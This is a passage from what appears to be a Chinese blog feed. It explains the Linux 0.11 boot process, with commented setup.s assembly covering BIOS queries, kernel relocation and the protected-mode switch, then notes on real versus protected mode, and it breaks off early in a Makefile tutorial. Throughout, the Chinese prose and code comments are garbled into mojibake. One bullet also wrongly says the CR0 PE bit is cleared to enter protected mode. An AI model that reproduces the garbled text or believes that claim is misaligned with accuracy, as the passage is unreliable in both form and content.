class="hljs-regexp">//</span> è·³è½¬åˆ°<span class="hljs-number">9020</span>:<span class="hljs-number">0000</span>ï¼ˆsetupç¨‹åºçš„å¼€å§‹å¤„ï¼‰ã€‚<br>db <span class="hljs-number">0</span>eah<br>dw <span class="hljs-number">0</span><br>dw SETUPSEG<br></code></pre></td></tr></table></figure><h1 id="3-setup"><a href="#3-setup" class="headerlink" title="3.setup"></a>3.setup</h1><p>åˆ©ç”¨BIOSä¸­æ–­è¯»å–æœºå™¨æ•°æ®ï¼Œå°†å…¶ä¿å­˜åˆ°0x90000åœ°å€å¤„ï¼ˆä¼šè¦†ç›–æ‰bootsectä»£ç ï¼‰ï¼Œè¿™äº›æ•°æ®åŒ…æ‹¬ç¡¬ä»¶å‚æ•°è¡¨ã€å…‰æ ‡ä½ç½®ã€æ ¹è®¾å¤‡å·ç­‰ç­‰</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-comment">;// setup.sè´Ÿè´£ä»BIOS ä¸­è·å–ç³»ç»Ÿæ•°æ®ï¼Œå¹¶å°†è¿™äº›æ•°æ®æ”¾åˆ°ç³»ç»Ÿå†…å­˜çš„é€‚å½“åœ°æ–¹ã€‚</span><br><span class="hljs-comment">;// æ­¤æ—¶setup.s å’Œsystem å·²ç»ç”±bootsect å¼•å¯¼å—åŠ è½½åˆ°å†…å­˜ä¸­ã€‚</span><br><span class="hljs-comment">;// è¿™æ®µä»£ç è¯¢é—®bios æœ‰å…³å†…å­˜/ç£ç›˜/å…¶å®ƒå‚æ•°ï¼Œå¹¶å°†è¿™äº›å‚æ•°æ”¾åˆ°ä¸€ä¸ª</span><br><span class="hljs-comment">;// â€œå®‰å…¨çš„â€åœ°æ–¹ï¼š90000-901FFï¼Œä¹Ÿå³åŸæ¥bootsect ä»£ç å—æ›¾ç»åœ¨</span><br><span class="hljs-comment">;// çš„åœ°æ–¹ï¼Œç„¶ååœ¨è¢«ç¼“å†²å—è¦†ç›–æ‰ä¹‹å‰ç”±ä¿æŠ¤æ¨¡å¼çš„system è¯»å–ã€‚</span><br><br><span class="hljs-comment">;// ä»¥ä¸‹è¿™äº›å‚æ•°æœ€å¥½å’Œbootsect.s ä¸­çš„ç›¸åŒï¼</span><br> INITSEG  = <span class="hljs-number">9000h</span><span class="hljs-comment">;// åŸæ¥bootsect æ‰€å¤„çš„æ®µ</span><br> SYSSEG   = <span class="hljs-number">1000h</span><span class="hljs-comment">;// system åœ¨10000(64k)å¤„ã€‚</span><br> SETUPSEG = <span class="hljs-number">9020h</span><span class="hljs-comment">;// æœ¬ç¨‹åºæ‰€åœ¨çš„æ®µåœ°å€ã€‚</span><br><br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span><br><br><span class="hljs-comment">;// ok, æ•´ä¸ªè¯»ç£ç›˜è¿‡ç¨‹éƒ½æ­£å¸¸ï¼Œç°åœ¨å°†å…‰æ ‡ä½ç½®ä¿å­˜ä»¥å¤‡ä»Šåä½¿ç”¨ã€‚</span><br><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,INITSEG<span class="hljs-comment">;// å°†ds ç½®æˆINITSEG(9000)ã€‚è¿™å·²ç»åœ¨bootsect ç¨‹åºä¸­</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><span class="hljs-comment">;// è®¾ç½®è¿‡ï¼Œä½†æ˜¯ç°åœ¨æ˜¯setup ç¨‹åºï¼ŒLinus è§‰å¾—éœ€è¦å†é‡æ–°</span><br><span class="hljs-comment">;// è®¾ç½®ä¸€ä¸‹ã€‚</span><br><span class="hljs-keyword">mov</span><span class="hljs-number">ah</span>,<span class="hljs-number">03h</span><span class="hljs-comment">;// BIOS ä¸­æ–­10 çš„è¯»å…‰æ ‡åŠŸèƒ½å·ah = 03</span><br><span class="hljs-keyword">xor</span><span class="hljs-number">bh</span>,<span class="hljs-number">bh</span><span class="hljs-comment">;// è¾“å…¥ï¼šbh = é¡µå·</span><br><span class="hljs-keyword">int</span><span class="hljs-number">10h</span><span class="hljs-comment">;// è¿”å›ï¼šch = æ‰«æå¼€å§‹çº¿ï¼Œcl = æ‰«æç»“æŸçº¿ï¼Œ</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">0</span>],<span class="hljs-built_in">dx</span><span class="hljs-comment">;// dh = è¡Œå·(00 æ˜¯é¡¶ç«¯)ï¼Œdl = åˆ—å·(00 æ˜¯å·¦è¾¹)ã€‚</span><br><span class="hljs-comment">;// å°†å…‰æ ‡ä½ç½®ä¿¡æ¯å­˜æ”¾åœ¨90000 å¤„ï¼Œæ§åˆ¶å°åˆå§‹åŒ–æ—¶ä¼šæ¥å–ã€‚</span><br><span class="hljs-keyword">mov</span><span class="hljs-number">ah</span>,<span class="hljs-number">88h</span><span class="hljs-comment">;// è¿™3å¥å–æ‰©å±•å†…å­˜çš„å¤§å°å€¼ï¼ˆKBï¼‰ã€‚</span><br><span class="hljs-keyword">int</span><span class="hljs-number">15h</span><span class="hljs-comment">;// æ˜¯è°ƒç”¨ä¸­æ–­15ï¼ŒåŠŸèƒ½å·ah = 88</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">2</span>],<span class="hljs-built_in">ax</span><span class="hljs-comment">;// è¿”å›ï¼šax = ä»100000ï¼ˆ1Mï¼‰å¤„å¼€å§‹çš„æ‰©å±•å†…å­˜å¤§å°(KB)ã€‚</span><br><span class="hljs-comment">;// è‹¥å‡ºé”™åˆ™CF ç½®ä½ï¼Œax = å‡ºé”™ç ã€‚</span><br><br><span class="hljs-comment">;// ä¸‹é¢è¿™æ®µç”¨äºå–æ˜¾ç¤ºå¡å½“å‰æ˜¾ç¤ºæ¨¡å¼ã€‚</span><br><span class="hljs-comment">;// è°ƒç”¨BIOS ä¸­æ–­10ï¼ŒåŠŸèƒ½å·ah = 0f</span><br><span class="hljs-comment">;// è¿”å›ï¼šah = å­—ç¬¦åˆ—æ•°ï¼Œal = æ˜¾ç¤ºæ¨¡å¼ï¼Œbh = å½“å‰æ˜¾ç¤ºé¡µã€‚</span><br><span class="hljs-comment">;// 90004(1 å­—)å­˜æ”¾å½“å‰é¡µï¼Œ90006 æ˜¾ç¤ºæ¨¡å¼ï¼Œ90007 å­—ç¬¦åˆ—æ•°ã€‚</span><br><span class="hljs-keyword">mov</span><span class="hljs-number">ah</span>,<span class="hljs-number">0fh</span><br><span class="hljs-keyword">int</span><span class="hljs-number">10h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">4</span>],<span class="hljs-built_in">bx</span><span class="hljs-comment">;// bh = display page</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">6</span>],<span class="hljs-built_in">ax</span><span class="hljs-comment">;// al = video mode, ah = window width</span><br><br><span class="hljs-comment">;// æ£€æŸ¥æ˜¾ç¤ºæ–¹å¼ï¼ˆEGA/VGAï¼‰å¹¶å–å‚æ•°ã€‚</span><br><span class="hljs-comment">;// è°ƒç”¨BIOS ä¸­æ–­10ï¼Œé™„åŠ åŠŸèƒ½é€‰æ‹©-å–æ–¹å¼ä¿¡æ¯</span><br><span class="hljs-comment">;// åŠŸèƒ½å·ï¼šah = 12ï¼Œbl = 10</span><br><span class="hljs-comment">;// è¿”å›ï¼šbh = æ˜¾ç¤ºçŠ¶æ€</span><br><span class="hljs-comment">;// (00 - å½©è‰²æ¨¡å¼ï¼ŒI/O ç«¯å£=3dX)</span><br><span class="hljs-comment">;// (01 - å•è‰²æ¨¡å¼ï¼ŒI/O ç«¯å£=3bX)</span><br><span class="hljs-comment">;// bl = å®‰è£…çš„æ˜¾ç¤ºå†…å­˜</span><br><span class="hljs-comment">;// (00 - 64k, 01 - 128k, 02 - 192k, 03 = 256k)</span><br><span class="hljs-comment">;// cx = æ˜¾ç¤ºå¡ç‰¹æ€§å‚æ•°(å‚è§ç¨‹åºåçš„è¯´æ˜)ã€‚</span><br><span class="hljs-keyword">mov</span><span class="hljs-number">ah</span>,<span class="hljs-number">12h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">bl</span>,<span class="hljs-number">10h</span><br><span class="hljs-keyword">int</span><span class="hljs-number">10h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">8</span>],<span class="hljs-built_in">ax</span><span class="hljs-comment">;// 90008 = ??</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">10</span>],<span class="hljs-built_in">bx</span><span class="hljs-comment">;// 9000A = å®‰è£…çš„æ˜¾ç¤ºå†…å­˜ï¼Œ9000B = æ˜¾ç¤ºçŠ¶æ€(å½©è‰²/å•è‰²)</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>:[<span class="hljs-number">12</span>],<span class="hljs-built_in">cx</span><span class="hljs-comment">;// 9000C = æ˜¾ç¤ºå¡ç‰¹æ€§å‚æ•°ã€‚</span><br><br><span class="hljs-comment">;// å–ç¬¬ä¸€ä¸ªç¡¬ç›˜çš„ä¿¡æ¯ï¼ˆå¤åˆ¶ç¡¬ç›˜å‚æ•°è¡¨ï¼‰ã€‚</span><br><span class="hljs-comment">;// ç¬¬1 ä¸ªç¡¬ç›˜å‚æ•°è¡¨çš„é¦–åœ°å€ç«Ÿç„¶æ˜¯ä¸­æ–­å‘é‡41 çš„å‘é‡å€¼ï¼è€Œç¬¬2 ä¸ªç¡¬ç›˜</span><br><span class="hljs-comment">;// å‚æ•°è¡¨ç´§æ¥ç¬¬1 ä¸ªè¡¨çš„åé¢ï¼Œä¸­æ–­å‘é‡46 çš„å‘é‡å€¼ä¹ŸæŒ‡å‘è¿™ç¬¬2 ä¸ªç¡¬ç›˜</span><br><span class="hljs-comment">;// çš„å‚æ•°è¡¨é¦–å€ã€‚è¡¨çš„é•¿åº¦æ˜¯16 ä¸ªå­—èŠ‚(10)ã€‚</span><br><span class="hljs-comment">;// ä¸‹é¢ä¸¤æ®µç¨‹åºåˆ†åˆ«å¤åˆ¶BIOS æœ‰å…³ä¸¤ä¸ªç¡¬ç›˜çš„å‚æ•°è¡¨ï¼Œ90080 å¤„å­˜æ”¾ç¬¬1 ä¸ª</span><br><span class="hljs-comment">;// ç¡¬ç›˜çš„è¡¨ï¼Œ90090 å¤„å­˜æ”¾ç¬¬2 ä¸ªç¡¬ç›˜çš„è¡¨ã€‚</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">0000h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">lds</span><span class="hljs-built_in">si</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-number">4</span>*<span class="hljs-number">41h</span>]<span class="hljs-comment">;// å–ä¸­æ–­å‘é‡41 çš„å€¼ï¼Œä¹Ÿå³hd0 å‚æ•°è¡¨çš„åœ°å€ ds:si</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,INITSEG<br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">di</span>,<span class="hljs-number">0080h</span><span class="hljs-comment">;// ä¼ è¾“çš„ç›®çš„åœ°å€: 9000:0080 -&gt; es:di</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cx</span>,<span class="hljs-number">10h</span><span class="hljs-comment">;// å…±ä¼ è¾“10 å­—èŠ‚ã€‚</span><br><span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsb</span><br><br><span class="hljs-comment">;// Get hd1 data</span><br><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">0000h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">lds</span><span class="hljs-built_in">si</span>,<span class="hljs-built_in">ds</span>:[<span class="hljs-number">4</span>*<span class="hljs-number">46h</span>]<span class="hljs-comment">;// å–ä¸­æ–­å‘é‡46 çš„å€¼ï¼Œä¹Ÿå³hd1 å‚æ•°è¡¨çš„åœ°å€ -&gt; ds:si</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,INITSEG<br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">di</span>,<span class="hljs-number">0090h</span><span class="hljs-comment">;// ä¼ è¾“çš„ç›®çš„åœ°å€: 9000:0090 -&gt; es:di</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cx</span>,<span class="hljs-number">10h</span><br><span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsb</span><br><br><br><span class="hljs-comment">;// æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨ç¬¬2 ä¸ªç¡¬ç›˜ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ç¬¬2 ä¸ªè¡¨æ¸…é›¶ã€‚</span><br><span class="hljs-comment">;// åˆ©ç”¨BIOS ä¸­æ–­è°ƒç”¨13 çš„å–ç›˜ç±»å‹åŠŸèƒ½ã€‚</span><br><span class="hljs-comment">;// åŠŸèƒ½å·ah = 15ï¼›</span><br><span class="hljs-comment">;// è¾“å…¥ï¼šdl = é©±åŠ¨å™¨å·ï¼ˆ8X æ˜¯ç¡¬ç›˜ï¼š80 æŒ‡ç¬¬1 ä¸ªç¡¬ç›˜ï¼Œ81 ç¬¬2 ä¸ªç¡¬ç›˜ï¼‰</span><br><span class="hljs-comment">;// è¾“å‡ºï¼šah = ç±»å‹ç ï¼›00 --æ²¡æœ‰è¿™ä¸ªç›˜ï¼ŒCF ç½®ä½ï¼› 01 --æ˜¯è½¯é©±ï¼Œæ²¡æœ‰change-line æ”¯æŒï¼›</span><br><span class="hljs-comment">;//  02--æ˜¯è½¯é©±(æˆ–å…¶å®ƒå¯ç§»åŠ¨è®¾å¤‡)ï¼Œæœ‰change-line æ”¯æŒï¼› 03 --æ˜¯ç¡¬ç›˜ã€‚</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">1500h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">dl</span>,<span class="hljs-number">81h</span><br><span class="hljs-keyword">int</span><span class="hljs-number">13h</span><br><span class="hljs-keyword">jc</span>no_disk1<br><span class="hljs-keyword">cmp</span><span class="hljs-number">ah</span>,<span class="hljs-number">3</span><span class="hljs-comment">;// æ˜¯ç¡¬ç›˜å—ï¼Ÿ(ç±»å‹= 3 ï¼Ÿ)ã€‚</span><br><span class="hljs-keyword">je</span>is_disk1<br><span class="hljs-symbol">no_disk1:</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,INITSEG<span class="hljs-comment">;// ç¬¬2ä¸ªç¡¬ç›˜ä¸å­˜åœ¨ï¼Œåˆ™å¯¹ç¬¬2ä¸ªç¡¬ç›˜è¡¨æ¸…é›¶ã€‚</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">di</span>,<span class="hljs-number">0090h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">cx</span>,<span class="hljs-number">10h</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">00h</span><br><span class="hljs-keyword">rep</span> <span class="hljs-keyword">stosb</span><br></code></pre></td></tr></table></figure><p>å°†ä½äº0x10000åœ°å€å¤„çš„å†…æ ¸ç¨‹åºå¤åˆ¶åˆ°0x00000åœ°å€å¤„ï¼ˆä¼šè¦†ç›–æ‰ç»ˆç«¯å‘é‡è¡¨å’ŒBIOSæ•°æ®åŒºï¼‰</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">do_move:</span><br><span class="hljs-keyword">mov</span><span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><span class="hljs-comment">;// es:di -&gt; ç›®çš„åœ°å€(åˆå§‹ä¸º0000:0)</span><br><span class="hljs-keyword">add</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">1000h</span><br><span class="hljs-keyword">cmp</span><span class="hljs-built_in">ax</span>,<span class="hljs-number">9000h</span><span class="hljs-comment">;// å·²ç»æŠŠä»8000 æ®µå¼€å§‹çš„64k ä»£ç ç§»åŠ¨å®Œï¼Ÿ</span><br><span class="hljs-keyword">jz</span>end_move<br><span class="hljs-keyword">mov</span><span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><span class="hljs-comment">;// ds:si -&gt; æºåœ°å€(åˆå§‹ä¸º1000:0)</span><br><span class="hljs-keyword">sub</span><span class="hljs-built_in">di</span>,<span class="hljs-built_in">di</span><br><span class="hljs-keyword">sub</span><span class="hljs-built_in">si</span>,<span class="hljs-built_in">si</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">8000h</span><span class="hljs-comment">;// ç§»åŠ¨8000 å­—ï¼ˆ64k å­—èŠ‚ï¼‰ã€‚</span><br><span class="hljs-keyword">rep</span> <span class="hljs-keyword">movsw</span><br><span class="hljs-keyword">jmp</span>do_move<br></code></pre></td></tr></table></figure><p>ä¸ºäº†ç»™åé¢çš„ä¿æŠ¤æ¨¡å¼åšå‡†å¤‡ï¼Œsetupç¨‹åºè¿˜è¦å¯¹ä¸­æ–­æè¿°ç¬¦è¡¨å¯„å­˜å™¨ï¼ˆIDTRï¼‰å’Œå…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨ï¼ˆGDTRï¼‰è¿›è¡Œåˆå§‹åŒ–è®¾ç½®</p><p>ä¹‹åï¼Œè®¾ç½® CPU çš„æ§åˆ¶å¯„å­˜å™¨ CR0ï¼ˆä¹Ÿç§°æœºå™¨çŠ¶æ€å­—ï¼‰ï¼Œä»è€Œè¿›å…¥ 32 ä½ä¿æŠ¤æ¨¡å¼è¿è¡Œï¼Œå¹¶è·³<br>è½¬åˆ°ä½äº system æ¨¡å—æœ€å‰é¢éƒ¨åˆ†çš„ head.s ç¨‹åºç»§ç»­è¿è¡Œ</p><ul><li>æ‰“å¼€A20ï¼Œå®ç°4GBå¯»å€</li><li>å°†CR0å¯„å­˜å™¨çš„ç¬¬0ä½ï¼ˆPEï¼‰ç½®é›¶ï¼Œå°†å¤„ç†å™¨å·¥ä½œæ–¹å¼è®¾ç½®ä¸ºä¿æŠ¤æ¨¡å¼</li></ul><h1 id="4-headç¨‹åº"><a href="#4-headç¨‹åº" class="headerlink" title="4.headç¨‹åº"></a>4.headç¨‹åº</h1><p>ä¹‹å‰æåˆ°systemæ¨¡å—ä¼šè¢«å¤åˆ¶åˆ°0x00000å¼€å§‹çš„ä½ç½®ï¼Œheadç¨‹åºå…¶å®æ˜¯systemæ¨¡å—çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸”æ˜¯æœ€å¼€å§‹çš„éƒ¨åˆ†ï¼Œ0x00000å…¶å®ä¹Ÿæ˜¯headç¨‹åºçš„èµ·å§‹åœ°å€ã€‚head.s ä¸å‰é¢bootsect.så’Œsetup.sæ±‡ç¼–ä¸åŒï¼Œä½¿ç”¨çš„æ˜¯AT&amp;Tæ ¼å¼çš„æ±‡ç¼–</p><ul><li>åŠ è½½å„ä¸ªæ•°æ®æ®µå¯„å­˜å™¨ï¼Œé‡æ–°è®¾ç½®ä¸­æ–­æè¿°ç¬¦è¡¨ idtï¼Œå…± 256 é¡¹ï¼Œå¹¶ä½¿å„ä¸ªè¡¨é¡¹å‡æŒ‡å‘ä¸€ä¸ªåªæŠ¥é”™è¯¯çš„å“‘ä¸­æ–­ç¨‹åº</li><li>é‡æ–°è®¾ç½®å…¨å±€æè¿°ç¬¦è¡¨ gdt</li><li>ä½¿ç”¨ç‰©ç†åœ°å€ 0 ä¸ 1M å¼€å§‹å¤„çš„å†…å®¹ç›¸æ¯”è¾ƒçš„æ–¹æ³•ï¼Œæ£€æµ‹ A20 åœ°å€çº¿æ˜¯å¦å·²çœŸçš„å¼€å¯</li><li>è®¾ç½®ç®¡ç†å†…å­˜çš„åˆ†é¡µå¤„ç†æœºåˆ¶ï¼Œå°†é¡µç›®å½•è¡¨æ”¾åœ¨ç»å¯¹ç‰©ç†åœ°å€ 0 å¼€å§‹å¤„ç´§éšåé¢æ”¾ç½®å…±å¯å¯»å€ 16MB å†…å­˜çš„ 4 ä¸ªé¡µè¡¨ï¼Œå¹¶åˆ†åˆ«è®¾ç½®å®ƒä»¬çš„è¡¨é¡¹</li><li>æœ€ååˆ©ç”¨è¿”å›æŒ‡ä»¤å°†é¢„å…ˆæ”¾ç½®åœ¨å †æ ˆä¸­çš„/init/main.c ç¨‹åºçš„å…¥å£åœ°å€å¼¹å‡ºï¼Œå»è¿è¡Œ main()ç¨‹åº</li></ul><h1 id="å®æ¨¡å¼ä¸ä¿æŠ¤æ¨¡å¼"><a href="#å®æ¨¡å¼ä¸ä¿æŠ¤æ¨¡å¼" class="headerlink" title="å®æ¨¡å¼ä¸ä¿æŠ¤æ¨¡å¼"></a>å®æ¨¡å¼ä¸ä¿æŠ¤æ¨¡å¼</h1><p>å®æ¨¡å¼ï¼š</p><ul><li>å¯»å€<ul><li>æ®µå¯„å­˜å™¨å­˜æ”¾æ®µçš„åŸºåœ°å€ï¼Œå’Œåç§»å€¼å…±åŒç¡®å®šå†…å­˜åœ°å€ï¼Œæ­¤å†…å­˜åœ°å€å³æ˜¯çœŸå®ç‰©ç†åœ°å€ï¼Œæœ€å¤§å¯»å€ç©ºé—´æ˜¯20ä½ï¼Œ1MB</li></ul></li><li>ä¸­æ–­æœºåˆ¶<ul><li>ä½¿ç”¨ä¸­æ–­å‘é‡è¡¨ï¼Œå…¶å®ä½ç½®åœ¨0x00000ï¼Œä½ç½®å›ºå®š</li></ul></li></ul><p>ä¿æŠ¤æ¨¡å¼ï¼š</p><ul><li>å¯»å€  <ul><li>æ®µå¯„å­˜å™¨å­˜æ”¾æ®µæè¿°ç¬¦è¡¨ä¸­æŸä¸€é¡¹çš„ç´¢å¼•ï¼Œç´¢å¼•å€¼æ‰€æŒ‡å‘çš„æ®µæè¿°ç¬¦é¡¹åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š<ul><li>è¦å¯»å€çš„å†…å­˜æ®µçš„åŸºåœ°å€</li><li>æ®µçš„æœ€å¤§é•¿åº¦å€¼</li><li>æ®µçš„è®¿é—®çº§åˆ«ç­‰ä¿¡æ¯</li></ul></li><li>æœ€å¤§å¯»å€ç©ºé—´æ˜¯32ä½ï¼Œ4GB</li></ul></li><li>ä¸­æ–­æœºåˆ¶<ul><li>ä½¿ç”¨ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆIDTï¼‰ï¼Œå¯ä»¥ç”±æ“ä½œç³»ç»Ÿçµæ´»å®‰æ’ï¼Œé€šè¿‡IDTRå¯„å­˜å™¨å®šä½ä½ç½®</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linuxå†…æ ¸</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Makefileï¼šä¸€ä¸ªç®€å•çš„å…¥é—¨</title>
    <link href="/p/b7f87e4d/"/>
    <url>/p/b7f87e4d/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/CMake-Logo.png"></p><h1 id="ä¸ºä»€ä¹ˆä½¿ç”¨Makefile"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨Makefile" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨Makefile"></a>ä¸ºä»€ä¹ˆä½¿ç”¨Makefile</h1><p>Makefileå¯ä»¥ä½¿æ„å»ºæ›´æ–¹ä¾¿ã€å‡å°‘ä¸å¿…è¦çš„æ„å»º</p><p>æƒ³è±¡ä»¥ä¸‹æƒ…æ™¯ï¼Œç›®æ ‡æ–‡ä»¶mainçš„ä¾èµ–å…³ç³»å¦‚ä¸‹ï¼š<br><img src="/image/Pastedimage20220912172957.png"><br>é‚£ä¹ˆå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¡Œè¿›è¡Œç¼–è¯‘ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gcc <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.c</span> stack<span class="hljs-selector-class">.c</span> maze<span class="hljs-selector-class">.c</span> -o main<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆä¼šå‡ºç°ä»¥ä¸‹çŠ¶å†µï¼š</p><ul><li>å³ä½¿æ˜¯ä»…ä»…æ”¹å˜äº†æŸä¸€ä¸ªæ–‡ä»¶çš„ä¸€è¡Œä»£ç ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„.oæ–‡ä»¶éƒ½éœ€è¦é‡æ–°ç”Ÿæˆï¼Œç„¶åé€šè¿‡é“¾æ¥å¾—åˆ°ç›®æ ‡æ–‡ä»¶ï¼Œè¿™ä¸ªå¼€é”€æ˜¯å·¨å¤§çš„<ul><li>ä¸€ä¸ªæç«¯æƒ…æ™¯ï¼šä¸€ä¸ªå¤§å‹çš„è½¯ä»¶é¡¹ç›®å¾€å¾€ç”±ä¸Šåƒä¸ªæºæ–‡ä»¶ç»„æˆï¼Œå…¨éƒ¨ç¼–è¯‘ä¸€ééœ€è¦å‡ ä¸ªå°æ—¶</li></ul></li><li>å¦‚æœæœ‰å¤šä¸ª.oæ–‡ä»¶ï¼Œæˆ‘ä»¬ä¿®æ”¹äº†æŸä¸€ä¸ªæ–‡ä»¶ï¼ˆæ¯”å¦‚.hæˆ–è€….cæ–‡ä»¶ï¼‰ï¼Œé‚£ä¹ˆä¼šå½±å“å¤šä¸ª.oæ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é‡æ–°ç¼–è¯‘è¿™äº›.oæ–‡ä»¶ï¼Œé‚£ä¹ˆç®¡ç†ä»–ä»¬çš„ä¾èµ–æ˜¯ååˆ†éº»çƒ¦çš„</li></ul><p>Makefileåº”è¿è€Œç”Ÿ</p><h1 id="Makefileæ ¼å¼"><a href="#Makefileæ ¼å¼" class="headerlink" title="Makefileæ ¼å¼"></a>Makefileæ ¼å¼</h1><p>åœ¨ç›®å½•ä¸‹å¿…é¡»æœ‰ä¸€ä¸ªMakefileæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åå¤§å°å†™æ•æ„Ÿï¼Œé‡Œé¢å†…å®¹ç±»ä¼¼ä¸‹é¢ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;target&gt; : &lt;prerequisites&gt; <br>[tab]  &lt;commands&gt; <span class="hljs-comment">#helloï¼Œthank you</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><ul><li>targetæ˜¯ç›®æ 